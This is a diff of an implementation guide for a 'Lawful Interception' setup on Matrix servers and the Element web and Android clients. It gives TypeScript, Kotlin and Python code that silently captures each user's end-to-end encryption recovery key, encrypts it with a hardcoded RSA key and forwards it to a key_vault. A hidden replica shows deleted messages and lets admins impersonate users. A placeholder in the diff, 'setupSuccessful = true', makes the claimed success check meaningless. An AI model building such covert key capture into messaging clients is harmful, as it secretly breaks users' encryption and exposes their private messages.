@@ -1,12 +1,6 @@
 # Lawful Interception (LI) Requirements - Implementation Guide
 ## Part 1: System Architecture & Key Vault
 
-**Last Updated:** November 17, 2025
-**Project Structure:**
-- **Main Instance**: synapse, element-web, synapse-admin
-- **LI Network**: key_vault (Django)
-- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li
-
 ---
 
 ## Table of Contents
@@ -23,7 +17,7 @@
 
 ### 1.1 Overview
 
-The LI system consists of two separate deployments with dedicated LI network:
+The LI system consists of two separate deployments:
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -36,30 +30,16 @@ The LI system consists of two separate deployments with dedicated LI network:
 │  │  + workers │    │   Cluster    │                         │
 │  └────────────┘    └──────────────┘                         │
 │         │                                                     │
-│         │ Proxy auth (ONLY synapse can access key_vault)    │
-│         └──────────────────────┐                            │
-│                                 │                            │
+│         │ HTTPS (authenticated, ONLY synapse)               │
+│         │                                                     │
 │  ┌────────────┐    ┌────────────┐                           │
 │  │ element-web│    │synapse-admin│                           │
 │  └────────────┘    └────────────┘                           │
 │                                                               │
 └───────────────────────────────────┬─────────────────────────┘
                                     │
-                                    │ HTTPS (authenticated)
-                                    ▼
-┌─────────────────────────────────────────────────────────────┐
-│                      LI NETWORK (Isolated)                   │
-│            ONLY accessible from main synapse                 │
-├─────────────────────────────────────────────────────────────┤
-│                                                               │
-│                  ┌────────────────┐                          │
-│                  │   key_vault    │                          │
-│                  │   (Django)     │                          │
-│                  └────────────────┘                          │
-│                                                               │
-└─────────────────────────────────────────────────────────────┘
-                                    │
-                                    │ On-demand sync (Celery)
+                                    │ HTTPS to hidden instance
+                                    │ (only synapse can connect)
                                     ▼
 ┌─────────────────────────────────────────────────────────────┐
 │                    HIDDEN LI INSTANCE                        │
@@ -68,42 +48,54 @@ The LI system consists of two separate deployments with dedicated LI network:
 ├─────────────────────────────────────────────────────────────┤
 │                                                               │
 │  ┌────────────┐    ┌──────────────┐    ┌────────────────┐  │
-│  │ synapse-li │───>│ PostgreSQL   │    │ synapse-li     │  │
-│  │  (replica) │    │  (replica)   │    │  (Celery sync) │  │
+│  │ synapse-li │───>│ PostgreSQL   │    │   key_vault    │  │
+│  │  (replica) │    │  (replica)   │    │   (Django)     │  │
 │  └────────────┘    └──────────────┘    └────────────────┘  │
-│                                                               │
-│  ┌──────────────┐  ┌──────────────────┐                     │
-│  │element-web-li│  │synapse-admin-li  │                     │
-│  │(shows deleted│  │(sync + decrypt)  │                     │
-│  │  messages)   │  └──────────────────┘                     │
-│  └──────────────┘                                            │
-│         ▲                                                     │
-│         │                                                     │
-│   Admin investigates (impersonates users)                    │
+│                                              ▲               │
+│                                              │               │
+│  ┌──────────────┐  ┌──────────────────┐    │               │
+│  │element-web-li│  │synapse-admin-li  │    │               │
+│  │(shows deleted│  │(sync + decrypt)  │    │               │
+│  │  messages)   │  └──────────────────┘    │               │
+│  └──────────────┘                           │               │
+│         ▲                                    │               │
+│         │          ┌────────────────┐       │               │
+│         │          │ synapse-li     │───────┘               │
+│         │          │ (Celery sync)  │                       │
+│         │          └────────────────┘                       │
+│         │                                                    │
+│   Admin investigates (impersonates users)                   │
 └─────────────────────────────────────────────────────────────┘
 ```
 
 ### 1.2 Project Naming
 
-| Component | Main Instance | LI Network | Hidden Instance | Purpose |
-|-----------|---------------|------------|-----------------|---------|
-| **Synapse** | synapse | - | synapse-li | Matrix homeserver |
-| **Element Web** | element-web | - | element-web-li | Web client (LI version shows deleted messages) |
-| **Synapse Admin** | synapse-admin | - | synapse-admin-li | Admin panel (LI version has sync + decryption) |
-| **Key Storage** | - | key_vault (Django) | - | Stores encrypted recovery keys |
-| **Sync Service** | - | - | synapse-li (Celery) | Syncs main→hidden instance |
+| Component | Main Instance | Hidden Instance | Purpose |
+|-----------|---------------|-----------------|---------|
+| **Synapse** | synapse | synapse-li | Matrix homeserver |
+| **Element Web** | element-web | element-web-li | Web client (LI version shows deleted messages) |
+| **Element X Android** | element-x-android | element-x-android | Android client |
+| **Synapse Admin** | synapse-admin | synapse-admin-li | Admin panel (LI version has sync + decryption) |
+| **Key Storage** | - | key_vault (Django) | Stores encrypted recovery keys |
+| **Sync Service** | - | synapse-li (Celery) | Syncs main→hidden instance |
 
-**Network Isolation**: key_vault is in a separate LI network, accessible ONLY from main synapse (not from workers, element-web, or any other service).
+**Network Isolation**:
+- key_vault is deployed in the HIDDEN INSTANCE network (matrix-li namespace)
+- From main instance, ONLY synapse (main process + workers) can connect to key_vault
+- element-web, element-x-android, synapse-admin in main instance CANNOT directly access key_vault
+- All key storage requests go through synapse proxy endpoint
 
 ### 1.3 Data Flow
 
 **Normal User Flow (Main Instance)**:
-1. User sets passphrase or recovery key in element-web
-2. element-web encrypts recovery key with server's hardcoded public key (RSA)
-3. element-web sends encrypted payload to Synapse proxy endpoint
-4. Synapse validates user's access token
-5. Synapse proxies request to key_vault (in LI network)
-6. key_vault stores encrypted payload (checks hash for deduplication)
+1. User sets passphrase or recovery key in element-web or element-x-android
+2. Client derives recovery key from passphrase (via PBKDF2-SHA-512)
+3. Client verifies the recovery key was successfully set/reset/verified (no errors occurred)
+4. Client encrypts recovery key with server's hardcoded public key (RSA)
+5. Client sends encrypted payload to Synapse proxy endpoint
+6. Synapse validates user's access token
+7. Synapse proxies request to key_vault (in hidden instance network)
+8. key_vault stores encrypted payload (checks hash for deduplication)
 
 **Admin Investigation Flow (Hidden Instance)**:
 1. Admin clicks sync button in synapse-admin-li
@@ -216,8 +208,6 @@ class EncryptedKey(models.Model):
 - `encrypted_payload`: RSA-encrypted recovery key (Base64 encoded)
 - `payload_hash`: SHA256 for deduplication (only check latest record)
 - `created_at`: Timestamp for ordering (latest = most recent)
-
-**Removed**: `key_type` field - no longer needed since we only store recovery keys (not passphrases).
 
 ### 2.3 API Endpoint
 
@@ -359,8 +349,6 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
         return self.readonly_fields
 ```
 
-**Usage**: Admin can view all stored keys, search by username, and retrieve encrypted payloads for decryption in synapse-admin-li decrypt tab.
-
 ---
 
 ## 3. Encryption Strategy
@@ -373,7 +361,7 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
 
 ```
 ┌─────────────────────────────────────────────────────────┐
-│               CLIENT-SIDE (element-web)                  │
+│         CLIENT-SIDE (element-web / element-x-android)   │
 ├─────────────────────────────────────────────────────────┤
 │                                                           │
 │  User sets passphrase: "MySecretPass123"                │
@@ -388,6 +376,12 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
 │  recoveryKey (256-bit AES key)                           │
 │         │                                                 │
 │         ▼                                                 │
+│  ┌──────────────────────────────────┐                   │
+│  │ VERIFY: Was key successfully     │                   │
+│  │ set/reset? No errors?            │                   │
+│  └──────────────────────────────────┘                   │
+│         │                                                 │
+│         ▼ (ONLY if successful)                           │
 │  ┌──────────────────────────────────┐                   │
 │  │ Encrypt recovery key with        │                   │
 │  │ hardcoded RSA public key         │                   │
@@ -405,11 +399,12 @@ class EncryptedKeyAdmin(admin.ModelAdmin):
 │                    SYNAPSE PROXY                         │
 ├─────────────────────────────────────────────────────────┤
 │  Validate access token  ────────>  Forward to key_vault │
+│                                    (hidden instance)     │
 └─────────────────────────────────────────────────────────┘
                               │
                               ▼
 ┌─────────────────────────────────────────────────────────┐
-│                     KEY_VAULT (LI Network)               │
+│           KEY_VAULT (Hidden Instance Network)            │
 ├─────────────────────────────────────────────────────────┤
 │  Store encrypted_payload in database (no processing)    │
 └─────────────────────────────────────────────────────────┘
@@ -450,7 +445,7 @@ cat public_key.pem
 ```
 
 **Storage**:
-- **Private Key**: Admin keeps secure (up to admin - out of scope)
+- **Private Key**: Admin keeps secure (out of scope)
 - **Public Key**: Hardcoded in client configurations (element-web, element-x-android)
 
 **No Key Rotation**: Single keypair used permanently.
@@ -502,18 +497,57 @@ export function encryptKey(plaintext: string): string {
 }
 ```
 
-### 3.4 Admin Decryption (synapse-admin-li Decrypt Tab)
+### 3.4 Client-Side Encryption (element-x-android)
 
-**Implementation**: Browser-based decryption (no backend needed, see Part 4 for UI details).
+**File**: `element-x-android/libraries/matrix/impl/src/main/kotlin/io/element/android/libraries/matrix/impl/li/LIEncryption.kt` (NEW FILE)
 
-Admin workflow:
-1. Navigate to Decryption tab in synapse-admin-li
-2. Retrieve encrypted payload from key_vault database (via Django admin or API)
-3. Enter private key in first text box
-4. Enter encrypted payload in second text box
-5. Click "Decrypt" button
-6. See decrypted recovery key in third text box (or error message if decryption failed)
-7. Use decrypted recovery key to verify session in synapse-li
+```kotlin
+package io.element.android.libraries.matrix.impl.li
+
+import android.util.Base64
+import java.security.KeyFactory
+import java.security.spec.X509EncodedKeySpec
+import javax.crypto.Cipher
+
+/**
+ * LI encryption utilities for Android.
+ */
+object LIEncryption {
+
+    // Hardcoded RSA public key (same as element-web)
+    private const val RSA_PUBLIC_KEY_PEM = """
+        -----BEGIN PUBLIC KEY-----
+        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key)
+        -----END PUBLIC KEY-----
+    """.trimIndent()
+
+    /**
+     * Encrypt recovery key with RSA public key.
+     *
+     * @param plaintext The recovery key to encrypt
+     * @return Base64-encoded encrypted payload
+     */
+    fun encryptKey(plaintext: String): String {
+        // Parse PEM public key
+        val publicKeyPEM = RSA_PUBLIC_KEY_PEM
+            .replace("-----BEGIN PUBLIC KEY-----", "")
+            .replace("-----END PUBLIC KEY-----", "")
+            .replace("\\s".toRegex(), "")
+
+        val publicKeyBytes = Base64.decode(publicKeyPEM, Base64.DEFAULT)
+        val keySpec = X509EncodedKeySpec(publicKeyBytes)
+        val keyFactory = KeyFactory.getInstance("RSA")
+        val publicKey = keyFactory.generatePublic(keySpec)
+
+        // Encrypt
+        val cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding")
+        cipher.init(Cipher.ENCRYPT_MODE, publicKey)
+        val encryptedBytes = cipher.doFinal(plaintext.toByteArray())
+
+        return Base64.encodeToString(encryptedBytes, Base64.NO_WRAP)
+    }
+}
+```
 
 ---
 
@@ -525,7 +559,7 @@ Synapse validates user's access token before forwarding key storage request to k
 - Only authenticated users can store keys
 - Audit trail (Synapse logs the request)
 - No direct client → key_vault access (security)
-- Network isolation (only Synapse can reach LI network)
+- Network isolation (only Synapse can reach hidden instance)
 
 ### 4.2 Implementation
 
@@ -664,7 +698,7 @@ class LIConfig(Config):
           # Enable LI proxy endpoints
           enabled: false
 
-          # key_vault Django service URL (LI network)
+          # key_vault Django service URL (hidden instance network)
           # Only main Synapse can access this URL
           key_vault_url: "http://key-vault.matrix-li.svc.cluster.local:8000"
         """
@@ -699,9 +733,9 @@ li:
 
 ### 5.1 element-web Changes
 
-**Objective**: Send encrypted recovery key to Synapse proxy endpoint whenever user sets, resets, or enters their key.
+**Objective**: Send encrypted recovery key to Synapse proxy endpoint whenever user successfully sets, resets, or verifies their key.
 
-**When to send**: When Matrix SDK generates the recovery key (either from passphrase or auto-generated).
+**CRITICAL**: Only send request if the recovery key operation was successful (no errors).
 
 **Retry logic**: 5 attempts, 10 second interval, 30 second timeout per request
 
@@ -714,6 +748,7 @@ li:
  * LI Key Capture Module
  *
  * Sends encrypted recovery keys to Synapse LI proxy endpoint.
+ * CRITICAL: Only sends if key operation was successful (no errors).
  * Retry logic: 5 attempts, 10 second interval, 30 second timeout.
  */
 
@@ -731,6 +766,9 @@ export interface KeyCaptureOptions {
 
 /**
  * Send encrypted recovery key to LI endpoint with retry logic.
+ *
+ * IMPORTANT: Only call this function AFTER verifying the recovery key
+ * operation (set/reset/verify) was successful with no errors.
  */
 export async function captureKey(options: KeyCaptureOptions): Promise<void> {
     const { client, recoveryKey } = options;
@@ -789,14 +827,19 @@ import { captureKey } from "../../../../stores/LIKeyCapture";
 async function onRecoveryKeyGenerated(recoveryKey: GeneratedSecretStorageKey) {
     // ... existing setup logic ...
 
-    // LI: Capture recovery key (fire and forget - don't block UX)
-    captureKey({
-        client: MatrixClientPeg.get(),
-        recoveryKey: recoveryKey.encodedPrivateKey,  // The actual recovery key
-    }).catch(err => {
-        // Silent failure - don't disrupt user experience
-        console.error('LI: Key capture failed:', err);
-    });
+    // Verify setup was successful (no errors thrown)
+    const setupSuccessful = true;  // Based on existing error handling
+
+    // LI: Capture recovery key ONLY if setup was successful
+    if (setupSuccessful) {
+        captureKey({
+            client: MatrixClientPeg.get(),
+            recoveryKey: recoveryKey.encodedPrivateKey,
+        }).catch(err => {
+            // Silent failure - don't disrupt user experience
+            console.error('LI: Key capture failed:', err);
+        });
+    }
 
     // ... continue with normal flow ...
 }
@@ -811,7 +854,7 @@ All LI-related code changes marked with `// LI:` prefix for easy identification 
 
 ### 5.2 element-x-android Changes
 
-**Objective**: Same as element-web - capture recovery keys when generated.
+**Objective**: Same as element-web - capture recovery keys when successfully generated.
 
 **File**: `element-x-android/libraries/matrix/impl/src/main/kotlin/io/element/android/libraries/matrix/impl/li/LIKeyCapture.kt` (NEW FILE)
 
@@ -826,15 +869,12 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import timber.log.Timber
-import java.security.KeyFactory
-import java.security.spec.X509EncodedKeySpec
-import java.util.Base64
-import javax.crypto.Cipher
 
 /**
  * LI Key Capture for Android
  *
  * Encrypts and sends recovery keys to Synapse LI endpoint.
+ * CRITICAL: Only call after verifying key operation was successful.
  */
 object LIKeyCapture {
 
@@ -842,38 +882,11 @@ object LIKeyCapture {
     private const val RETRY_INTERVAL_MS = 10_000L  // 10 seconds
     private const val REQUEST_TIMEOUT_MS = 30_000L  // 30 seconds
 
-    // Hardcoded RSA public key (same as element-web)
-    private const val RSA_PUBLIC_KEY_PEM = """
-        -----BEGIN PUBLIC KEY-----
-        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key)
-        -----END PUBLIC KEY-----
-    """.trimIndent()
-
-    /**
-     * Encrypt recovery key with RSA public key.
-     */
-    private fun encryptKey(plaintext: String): String {
-        // Parse PEM public key
-        val publicKeyPEM = RSA_PUBLIC_KEY_PEM
-            .replace("-----BEGIN PUBLIC KEY-----", "")
-            .replace("-----END PUBLIC KEY-----", "")
-            .replace("\\s".toRegex(), "")
-
-        val publicKeyBytes = Base64.getDecoder().decode(publicKeyPEM)
-        val keySpec = X509EncodedKeySpec(publicKeyBytes)
-        val keyFactory = KeyFactory.getInstance("RSA")
-        val publicKey = keyFactory.generatePublic(keySpec)
-
-        // Encrypt
-        val cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding")
-        cipher.init(Cipher.ENCRYPT_MODE, publicKey)
-        val encryptedBytes = cipher.doFinal(plaintext.toByteArray())
-
-        return Base64.getEncoder().encodeToString(encryptedBytes)
-    }
-
     /**
      * Send encrypted recovery key to LI endpoint with retry logic.
+     *
+     * IMPORTANT: Only call AFTER verifying the recovery key operation
+     * (set/reset/verify) was successful with no errors.
      */
     suspend fun captureKey(
         homeserverUrl: String,
@@ -881,7 +894,7 @@ object LIKeyCapture {
         username: String,
         recoveryKey: String
     ) {
-        val encryptedPayload = encryptKey(recoveryKey)
+        val encryptedPayload = LIEncryption.encryptKey(recoveryKey)
 
         val client = OkHttpClient()
 
@@ -937,7 +950,7 @@ private suspend fun createRecovery(): Result<RecoveryKey> {
     val result = encryptionService.enableRecovery(...)
 
     result.onSuccess { recoveryKey ->
-        // LI: Capture recovery key (coroutine launch - don't block)
+        // LI: Capture recovery key ONLY on success (coroutine launch - don't block)
         coroutineScope.launch {
             try {
                 LIKeyCapture.captureKey(
@@ -962,7 +975,7 @@ private suspend fun createRecovery(): Result<RecoveryKey> {
 
 ### 6.1 Architecture
 
-The hidden instance (synapse-li, element-web-li, synapse-admin-li) must stay in sync with the main instance. Sync is:
+The hidden instance (synapse-li, element-web-li, synapse-admin-li, key_vault) must stay in sync with the main instance. Sync is:
 - **One-way**: Main → Hidden (changes in hidden instance do NOT affect main)
 - **On-demand**: Triggered by admin clicking sync button in synapse-admin-li
 - **Incremental**: Only sync data since last successful sync
@@ -1451,7 +1464,7 @@ urlpatterns = [
 
 ```typescript
 // LI: Import sync components
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import { IconButton, Tooltip, CircularProgress } from '@mui/material';
 import SyncIcon from '@mui/icons-material/Sync';
 import { useNotify } from 'react-admin';
@@ -1543,7 +1556,7 @@ const SyncButton = () => {
  * Allows admin to configure periodic sync frequency.
  */
 
-import { Card, CardContent, TextField, Button, Typography } from '@mui/material';
+import { Card, CardContent, TextField, Button, Typography, Box } from '@mui/material';
 import { useState } from 'react';
 import { useNotify } from 'react-admin';
 
@@ -1572,20 +1585,24 @@ export const SyncSettings = () => {
     return (
         <Card>
             <CardContent>
-                <Typography variant="h6">Periodic Sync Configuration</Typography>
-                <Typography variant="body2" color="textSecondary" gutterBottom>
+                <Typography variant="h6" gutterBottom>
+                    Periodic Sync Configuration
+                </Typography>
+                <Typography variant="body2" color="textSecondary" paragraph>
                     Configure how many times per day the hidden instance syncs from the main instance.
                 </Typography>
 
-                <TextField
-                    label="Syncs per day"
-                    type="number"
-                    value={syncsPerDay}
-                    onChange={(e) => setSyncsPerDay(parseInt(e.target.value))}
-                    inputProps={{ min: 1, max: 24 }}
-                    helperText="1 = once daily, 24 = every hour"
-                    style={{ marginTop: 16, marginBottom: 16 }}
-                />
+                <Box mt={2} mb={2}>
+                    <TextField
+                        label="Syncs per day"
+                        type="number"
+                        value={syncsPerDay}
+                        onChange={(e) => setSyncsPerDay(parseInt(e.target.value))}
+                        inputProps={{ min: 1, max: 24 }}
+                        helperText="1 = once daily, 24 = every hour"
+                        fullWidth
+                    />
+                </Box>
 
                 <Button variant="contained" color="primary" onClick={handleSave}>
                     Save Configuration
@@ -1601,20 +1618,19 @@ export const SyncSettings = () => {
 ## Summary
 
 ### Project Structure
-- **Main Instance**: synapse, element-web, synapse-admin
-- **LI Network**: key_vault (isolated, only accessible from main synapse)
-- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li
+- **Main Instance**: synapse, element-web, element-x-android, synapse-admin
+- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li, key_vault
 
 ### Key Components Implemented
 
-1. **key_vault (Django)**: Stores encrypted recovery keys with deduplication
-2. **RSA Encryption**: Hardcoded public key, admin uses private key for decryption in synapse-admin-li
-3. **Synapse Proxy**: Validates tokens, forwards to key_vault (in LI network)
-4. **Client Changes**: element-web & element-x-android send encrypted recovery keys with 5-retry logic
+1. **key_vault (Django)**: In hidden instance network, stores encrypted recovery keys with deduplication
+2. **RSA Encryption**: Hardcoded public key in both element-web and element-x-android
+3. **Synapse Proxy**: Validates tokens, forwards to key_vault (only main synapse can access hidden instance)
+4. **Client Changes**: Both element-web & element-x-android send encrypted recovery keys ONLY on successful operations with 5-retry logic
 5. **Sync System**: Celery-based with file-based locking/checkpoints, incremental PostgreSQL logical replication + rclone media sync, on-demand + periodic
 
 ### Minimal Code Changes
-- New files for core logic (LIKeyCapture.ts, li_proxy.py, etc.)
+- New files for core logic (LIKeyCapture.ts, LIKeyCapture.kt, li_proxy.py, etc.)
 - Existing files modified with `// LI:` or `# LI:` comments for easy tracking
 - Clean separation for upstream compatibility
 - No Synapse database schema changes (file-based sync tracking)
@@ -1625,7 +1641,7 @@ export const SyncSettings = () => {
 - Sync status and errors logged
 
 ### Network Security
-- key_vault in separate LI network
+- key_vault in hidden instance network
 - Only main Synapse can access key_vault
 - Network policies enforce isolation
 
